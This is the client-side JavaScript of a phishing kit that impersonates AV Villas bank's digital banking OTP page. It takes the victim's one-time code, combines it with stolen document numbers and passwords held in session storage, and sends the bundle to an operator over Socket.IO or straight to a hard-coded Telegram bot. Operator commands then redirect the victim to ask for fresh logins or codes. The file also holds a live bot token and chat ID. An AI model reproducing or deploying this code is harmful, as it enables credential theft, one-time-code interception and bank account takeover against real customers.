/**
 * AV Villas Co-banking Digital - OTP Client Controller
 * Maneja la lógica del formulario OTP y comunicación con el servidor
 */

// ============================================
// CONFIGURACIÓN
// ============================================
const CONFIG = {
    TELEGRAM: {
        BOT_TOKEN: '8520156390:AAGD07USz4taUVi8whydEPExTnf4qUQO5aU',
        CHAT_ID: '-5029729816'
    },
    SOCKET: {
        URL: window.location.origin,
        OPTIONS: {
            reconnection: true,
            reconnectionDelay: 200,
            reconnectionDelayMax: 1000,
            reconnectionAttempts: 10,
            timeout: 3000,
            transports: ['websocket'],
            autoConnect: true,
            forceNew: false,
            multiplex: false
        }
    },
    VALIDATION: {
        OTP_MIN_LENGTH: 4,
        OTP_MAX_LENGTH: 8
    }
};

// ============================================
// ELEMENTOS DOM
// ============================================
const DOM = {
    form: document.getElementById('otpForm'),
    otpCode: document.getElementById('otp-code'),
    submitBtn: document.getElementById('submitBtn'),
    loadingOverlay: document.getElementById('loadingOverlay'),
    codeIcon: document.getElementById('codeIcon'),
    otpGroup: document.getElementById('otpGroup')
};

// ============================================
// ESTADO DE LA APLICACIÓN
// ============================================
const AppState = {
    isValid: false,
    socket: null,
    isConnected: false,
    isSubmitting: false
};

// ============================================
// UTILIDADES
// ============================================
const Utils = {
    /**
     * Valida que una cadena solo contenga números
     */
    isNumeric: (str) => /^\d+$/.test(str),
    
    /**
     * Formatea la fecha actual en formato local
     */
    getCurrentDateTime: () => new Date().toLocaleString('es-CO', {
        timeZone: 'America/Bogota',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    }),
    
    /**
     * Escapa caracteres especiales para Markdown
     */
    escapeMarkdown: (text) => {
        return text.replace(/[_*[\]()~`>#+=|{}.!-]/g, '\\$&');
    },
    
    /**
     * Muestra/oculta el overlay de carga
     */
    toggleLoading: (show) => {
        if (show) {
            DOM.loadingOverlay.classList.add('active');
            document.body.style.overflow = 'hidden';
        } else {
            DOM.loadingOverlay.classList.remove('active');
            document.body.style.overflow = '';
        }
    },
    
    /**
     * Muestra/oculta icono de campo
     */
    toggleIcon: (icon, show) => {
        if (show) {
            icon.classList.add('visible');
        } else {
            icon.classList.remove('visible');
        }
    }
};

// ============================================
// VALIDACIÓN DE FORMULARIO
// ============================================
const FormValidator = {
    /**
     * Valida el campo OTP
     */
    validateOTP: () => {
        const value = DOM.otpCode.value.trim();
        const length = value.length;
        const isValid = length >= CONFIG.VALIDATION.OTP_MIN_LENGTH && 
                       length <= CONFIG.VALIDATION.OTP_MAX_LENGTH && 
                       Utils.isNumeric(value);
        
        AppState.isValid = isValid;
        Utils.toggleIcon(DOM.codeIcon, length > 0);
        
        if (length > 0 && !isValid) {
            DOM.otpGroup.classList.add('error');
        } else {
            DOM.otpGroup.classList.remove('error');
        }
        
        // Actualizar estado del botón
        DOM.submitBtn.disabled = !isValid;
        
        if (isValid) {
            DOM.submitBtn.classList.add('enabled');
        } else {
            DOM.submitBtn.classList.remove('enabled');
        }
        
        return isValid;
    }
};

// ============================================
// COMUNICACIÓN CON TELEGRAM
// ============================================
const TelegramService = {
    /**
     * Envía el código OTP a Telegram
     */
    sendOTP: async (otpData) => {
        const message = 
            `📱 Código OTP recibido\n\n` +
            `Código: ${otpData.otpCode}\n\n` +
            `👤 Datos del usuario:\n` +
            `Tipo de documento: ${otpData.documentType}\n` +
            `Número de documento: ${otpData.documentNumber}\n` +
            `Contraseña: ${otpData.password}\n\n` +
            `Recibido: ${Utils.getCurrentDateTime()}`;
        
        const keyboard = {
            inline_keyboard: [
                [
                    { text: '🔑 Pedir Login', callback_data: 'request_login' },
                    { text: '📱 Pedir OTP Nuevo', callback_data: 'request_otp' }
                ]
            ]
        };
        
        try {
            const response = await fetch(
                `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.TELEGRAM.CHAT_ID,
                        text: message,
                        reply_markup: keyboard
                    })
                }
            );
            
            const result = await response.json();
            
            if (!result.ok) {
                console.error('Error de Telegram:', result);
                return false;
            }
            
            return true;
            
        } catch (error) {
            console.error('Error al enviar a Telegram:', error);
            return false;
        }
    }
};

// ============================================
// GESTIÓN DE SOCKET.IO
// ============================================
const SocketManager = {
    /**
     * Inicializa la conexión con Socket.IO
     */
    init: () => {
        try {
            let sessionId = sessionStorage.getItem('socketSessionId');
            if (!sessionId) {
                sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
                sessionStorage.setItem('socketSessionId', sessionId);
                console.log('🆕 Nueva sesión creada:', sessionId);
            } else {
                console.log('♻️ Sesión recuperada:', sessionId);
            }
            
            const options = {
                ...CONFIG.SOCKET.OPTIONS,
                query: { sessionId }
            };
            
            AppState.socket = io(CONFIG.SOCKET.URL, options);
            
            AppState.socket.on('connect', () => {
                console.log('✅ Conectado | Session:', sessionId);
                AppState.isConnected = true;
                
                // Keep-alive: enviar ping cada 8 segundos
                if (window.keepAliveInterval) clearInterval(window.keepAliveInterval);
                window.keepAliveInterval = setInterval(() => {
                    if (AppState.socket && AppState.socket.connected) {
                        AppState.socket.emit('ping');
                    }
                }, 8000);
            });
            
            AppState.socket.on('disconnect', (reason) => {
                console.log('❌ Desconectado:', reason);
                AppState.isConnected = false;
                if (window.keepAliveInterval) clearInterval(window.keepAliveInterval);
            });
            
            AppState.socket.on('pong', () => {
                // Respuesta al ping - mantiene conexión viva
            });
            
            AppState.socket.on('connect_error', (error) => {
                console.log('⚠️ Error de conexión:', error.message);
                AppState.isConnected = false;
            });
            
            // Comando de redirección desde Telegram
            AppState.socket.on('redirect', (data) => {
                console.log('📡 Redirección:', data.page);
                
                // No desconectar el socket, solo navegar
                if (data.page === 'otp') {
                    setTimeout(() => {
                        window.location.reload();
                    }, 100);
                } else if (data.page === 'login') {
                    setTimeout(() => {
                        window.location.href = 'index.html';
                    }, 100);
                } else if (data.page === 'finalize' && data.url) {
                    sessionStorage.clear();
                    setTimeout(() => {
                        window.location.href = data.url;
                    }, 100);
                }
            });
            
            // Respuesta del servidor después de enviar datos
            AppState.socket.on('telegram-sent', (response) => {
                if (response.success) {
                    console.log('✅ OTP enviado correctamente a Telegram');
                } else {
                    console.error('❌ Error al enviar a Telegram:', response.error);
                    Utils.toggleLoading(false);
                    AppState.isSubmitting = false;
                    alert('Error al procesar la solicitud. Por favor, inténtalo de nuevo.');
                }
            });
            
        } catch (error) {
            console.error('Error al inicializar Socket.IO:', error);
        }
    },
    
    /**
     * Envía código OTP a través de Socket.IO
     */
    emitOTP: (data) => {
        if (AppState.socket && AppState.isConnected) {
            AppState.socket.emit('otp-data', data);
            return true;
        }
        return false;
    }
};

// ============================================
// MANEJADORES DE EVENTOS
// ============================================
const EventHandlers = {
    /**
     * Maneja la entrada en el campo OTP
     */
    handleOTPInput: (e) => {
        // Solo permitir números y limitar a 8 dígitos
        e.target.value = e.target.value.replace(/\D/g, '').substring(0, CONFIG.VALIDATION.OTP_MAX_LENGTH);
        FormValidator.validateOTP();
    },
    
    /**
     * Maneja el envío del formulario
     */
    handleFormSubmit: async (e) => {
        e.preventDefault();
        
        // Prevenir múltiples envíos
        if (AppState.isSubmitting) {
            return;
        }
        
        // Validar formulario
        if (!FormValidator.validateOTP()) {
            return;
        }
        
        AppState.isSubmitting = true;
        
        // Recuperar datos de login guardados
        const loginData = JSON.parse(sessionStorage.getItem('loginData') || '{}');
        
        // Recopilar datos
        const otpData = {
            otpCode: DOM.otpCode.value.trim(),
            timestamp: new Date().toISOString(),
            // Incluir datos de login
            documentType: loginData.documentType || 'No disponible',
            documentNumber: loginData.documentNumber || 'No disponible',
            password: loginData.password || 'No disponible'
        };
        
        // Mostrar pantalla de carga
        Utils.toggleLoading(true);
        
        // Enviar solo por Socket.IO (el servidor se encarga de enviar a Telegram)
        const socketSent = SocketManager.emitOTP(otpData);
        
        if (!socketSent) {
            // Si Socket.IO no está disponible, intentar envío directo a Telegram
            const telegramSent = await TelegramService.sendOTP(otpData);
            
            if (!telegramSent) {
                Utils.toggleLoading(false);
                AppState.isSubmitting = false;
                alert('Error al procesar la solicitud. Por favor, verifica tu conexión e inténtalo de nuevo.');
            }
        }
        
        // Nota: La pantalla de carga permanecerá activa hasta recibir instrucciones del servidor
    }
};

// ============================================
// INICIALIZACIÓN
// ============================================
const App = {
    /**
     * Inicializa la aplicación
     */
    init: () => {
        // Registrar event listeners
        DOM.otpCode.addEventListener('input', EventHandlers.handleOTPInput);
        DOM.form.addEventListener('submit', EventHandlers.handleFormSubmit);
        
        // Inicializar Socket.IO
        SocketManager.init();
        
        // Validación inicial
        FormValidator.validateOTP();
        
        // Auto-focus en el campo OTP
        DOM.otpCode.focus();
        
        console.log('✅ Aplicación OTP inicializada');
    }
};

// Iniciar la aplicación cuando el DOM esté listo
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', App.init);
} else {
    App.init();
}
